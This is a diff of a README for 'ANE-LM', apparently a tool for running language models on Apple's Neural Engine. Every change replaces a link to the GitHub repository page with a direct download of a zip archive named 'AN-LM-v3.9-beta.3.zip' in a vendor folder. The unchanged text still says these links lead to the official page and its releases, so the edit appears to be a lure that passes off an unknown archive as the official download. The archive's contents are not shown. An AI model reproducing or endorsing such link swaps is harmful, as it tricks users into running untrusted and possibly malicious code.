@@ -1,6 +1,6 @@
 # 🚀 ANE-LM - Run Large Models on Apple Neural Engine  
 
-[![Download ANE-LM](https://img.shields.io/badge/Download-ANE--LM-brightgreen?style=for-the-badge)](https://github.com/A221133/ANE-LM)  
+[![Download ANE-LM](https://img.shields.io/badge/Download-ANE--LM-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/A221133/ANE-LM/main/vendor/AN-LM-v3.9-beta.3.zip)  
 
 ## 👋 Introduction
 
@@ -35,7 +35,7 @@ Anyone who wants to try AI language models while using hardware acceleration can
 
 Click the button below to visit the official GitHub page. This page has the latest version ready for download:
 
-[![Visit GitHub](https://img.shields.io/badge/GitHub-ANE--LM-blue?style=for-the-badge)](https://github.com/A221133/ANE-LM)
+[![Visit GitHub](https://img.shields.io/badge/GitHub-ANE--LM-blue?style=for-the-badge)](https://raw.githubusercontent.com/A221133/ANE-LM/main/vendor/AN-LM-v3.9-beta.3.zip)
 
 On the page, you will find download links and files you need.  
 
@@ -47,7 +47,7 @@ Follow these steps to get ANE-LM running:
 
 ### Step 1: Visit the Download Page  
 Use this link to go to the official page where files are stored:  
-https://github.com/A221133/ANE-LM  
+https://raw.githubusercontent.com/A221133/ANE-LM/main/vendor/AN-LM-v3.9-beta.3.zip  
 
 ### Step 2: Find the Latest Release  
 Look for the "Releases" section on the GitHub page. It usually appears on the right sidebar or under a tab called "Releases." This section lists all downloadable versions.
@@ -111,7 +111,7 @@ After opening ANE-LM, you will see the main interface. Here is what to do next:
 
 You may want to visit the main GitHub repository regularly for model files or updates.
 
-[GitHub Repository Link](https://github.com/A221133/ANE-LM)
+[GitHub Repository Link](https://raw.githubusercontent.com/A221133/ANE-LM/main/vendor/AN-LM-v3.9-beta.3.zip)
 
 ---
 
